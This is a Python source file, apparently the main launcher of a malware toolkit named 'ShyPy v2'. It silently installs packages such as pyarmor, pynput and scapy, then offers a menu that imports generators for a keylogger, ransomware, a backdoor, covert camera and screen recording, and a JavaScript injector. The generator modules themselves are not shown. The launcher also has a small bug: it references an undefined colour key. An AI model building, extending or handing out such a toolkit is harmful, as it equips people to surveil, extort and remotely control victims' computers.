from multiprocessing import Process
import time
import subprocess
import os
from itertools import cycle
import sys
import platform

OS = platform.system().lower()

COLOR = {
    'BLACK': '\033[0;30m',
    'RED': '\033[0;31m',
    'GREEN': '\033[0;32m',
    'YELLOW': '\033[0;33m',
    'BLUE': '\033[0;34m',
    'MAGENTA': '\033[0;35m',
    'CYAN': '\033[0;36m',
    'WHITE': '\033[0;37m',
    'RESET': '\033[0m'
}

MODULES = {
    "pyarmor": "pyarmor",
    "mouse": "mouse",
    "mouseinfo": "mouseinfo",
    "pyautogui": "pyautogui",
    "scapy": "scapy",
    "pynput": "pynput",
    "cryptography": "cryptography",
    "simplejson": "simplejson",
}

class Shypy:
    def __init__(self):
        self.modules_inst = list(MODULES.keys())
        self.modules_impt = list(MODULES.values())

    def download_modules(self, modules_):
        try:
            for module in modules_:
                subprocess.run(["pip", "install", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["pip", "install", "opencv-python"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"\r{COLOR['GREEN']}[+]{COLOR['RESET']} Download completed.")
        except Exception as e:
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} Error while downloading modules: {str(e)}")

    def module_exists(self, module_name):
        try:
            __import__(module_name)
            return True
        except ImportError:
            return False

    def checkin(self):
        missing_modules = []
        for module in self.modules_impt:
            if not self.module_exists(module):
                missing_modules.append(module)

        if missing_modules:
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} The following modules are missing: {', '.join(missing_modules)}")
            ans = input(f"{COLOR['MAGENTA']}[?]{COLOR['RESET']} Do you want to install these modules? (Y/N): ").lower()
            if ans == "y":
                p1 = Process(target=self.download_modules, args=(missing_modules,))
                p2 = Process(target=self.loader)

                p1.start()
                p2.start()

                p1.join()
                p2.terminate()
            else:
                print(f"{COLOR['RED']}[x]{COLOR['RESET']} You need to install the required modules to continue.")
        else:
            print(f"{COLOR['GREEN']}[+]{COLOR['RESET']} All required modules are already installed.")
            self.startup()

    def loader(self):
        for c in cycle(["⢎⡰", "⢎⡡", "⢎⡑", "⢎⠱", "⠎⡱", "⢊⡱", "⢌⡱", "⢆⡱"]):
            sys.stdout.write(f'\rDownloading{COLOR["CYAN"]} {c} {COLOR["RESET"]}\t')
            sys.stdout.flush()
            time.sleep(0.07)

    def startup(self):
        try:
            self.clear()
            print(f"""{COLOR["RED"]}      
████████████████████████████████████████████████████████████████████████████╗
╚══██╔══════════════════════════════════════════════════════════════════════╝
   ██║  ██╗  ██╗  ███████╗     ██████╗  ██╗  ██╗  ██╗  ██╗  ██████═╗ ██╗  ██╗ 
   ██║  ██╚══██║  ██╔════╝    ██╔════╝  ██╚══██║  ██╚══██║  ██╔══██║ ██╚══██║
   ██║  ███████║  ███████╗    ╚██████═╗ ███████║  ╚██████║  ██████╔╝ ╚██████║
   ██║  ██╔══██║  ██╔════╝     ╚════██║ ██╔══██║   ╚═══██║  ██╔═══╝   ╚══╗██║
   ██║  ██║  ██║  ███████╗    ███████╔╝ ██║  ██║  ██████╔╝  ██║          ║██║
   ╚═╝  ╚═╝  ╚═╝  ╚══════╝    ╚══════╝  ╚═╝  ╚═╝  ╚═════╝   ╚═╝         ╔███║ V2
   ████████████████████████████████████████████████████████████████████████╔╝
   ╚═══════════════════════════════════════════════════════════════════════╝\n""")
            
            ans = input('\t\t\t[Press "ENTER" To Continue]: ').lower()

            if ans == "":
                self.program_menu()

            else:
                self.startup()
        
        except (KeyboardInterrupt):
            self.clear()
            print(f'Signed Out Of The Shypy v2{COLOR["RESET"]}')

    def program_menu(self):
        try:
            self.clear()
            print(f"""{COLOR['RESET']}
            ╔════════════════════════╦══════════════════════╦════════════════════════╗
            ║* Version  :    V2     *║ Welcome To The ShyPy ║*                      *║
            ╠════════════════════════╩═════════╦════════════╩════════════════════════╣
            ║           Module Name            ║          Operating System           ║  
            ╠══════════════════════════════════╬═════════════════════════════════════╣
            ║[1] Keylogger Generator           :    [ Windows | Linux | Darwin ]     ║
            ║[2] Ransomware Generator          :    [ Windows | Linux | Darwin ]     ║
            ║[3] Camera Recorder Generator     :    [ Windows | Linux | Darwin ]     ║
            ║[4] Screen Recorder Generator     :    [ Windows | Linux | Darwin ]     ║   
            ║[5] Back Door Generator           :    [ Windows | Linux | Darwin ]     ║
            ║[6] Js Injector                   :    [         | Linux |        ]     ║
            ╠══════════════════════════════════╬═════════════════════════════════════╣
            ║ "use"                            : Used To Select Modules.             ║
            ║ "exit"                           : To Log Out Of ShyPy v2.             ║  
            ╠═════════════════════╦════════════╩═══════════════╦═════════════════════╣
            ║*                   *║ Developed by Atahan Poyraz ║*                   *║
            ╚═════════════════════╩════════════════════════════╩═════════════════════╝\n""")
        
            ans = input(f"{COLOR['RED']}[ShyPy] =>{COLOR['RESET']} ").lower()

            if ans == "use 1" or ans == "use keylogger generator":
                from Modules.Keylogger_Generator.Keylogger_Generator import Generator
                gen = Generator()
                gen.start()
                
            elif ans == "use 2" or ans == "use ransomware generator":
                from Modules.Ransomware_Generator.Ransomware_Generator import RansomWare_Generator
                rg = RansomWare_Generator()
                rg.start()

            elif ans == "use 3" or ans == "use camera recorder":
                from Modules.Camera_Recorder.Camera_Recorder import Camera_Recorder
                camrec = Camera_Recorder()
                camrec.start()

            elif ans == "use 4" or ans == "user screen recorder":
                from Modules.Screen_Recorder.Screen_Recorder import Screen_Recorder
                screc = Screen_Recorder()
                screc.start()

            elif ans == "use 5" or ans == "use back door generator" or ans == "use backdoor generator":
                from Modules.BackDoor_Generator.BackDoor_Generator import Generator
                bckdoorgen = Generator()
                bckdoorgen.start()

            elif ans == "use 6" or ans == "use js injector":
                from Modules.JavaScript_Injector.Js_Injector import Js_Injector
                jsi = Js_Injector()
                jsi.start()

            elif ans == "exit":
                self.clear()
                print(f'Signed Out Of The Shypy v2{COLOR["ZERO"]}')

            else:
                print(f'{COLOR["YELLOW"]}[!]{COLOR["RESET"]} Invalid Option')
                time.sleep(0.5)
                self.program_menu()

        except (KeyboardInterrupt):
            self.clear()
            print(f'Signed Out Of The Shypy v2{COLOR["RESET"]}')

    def clear(self):
        if OS == "windows":
            os.system("cls")
        else:
            os.system("clear")

if __name__ == "__main__":
    s = Shypy()
    s.checkin()
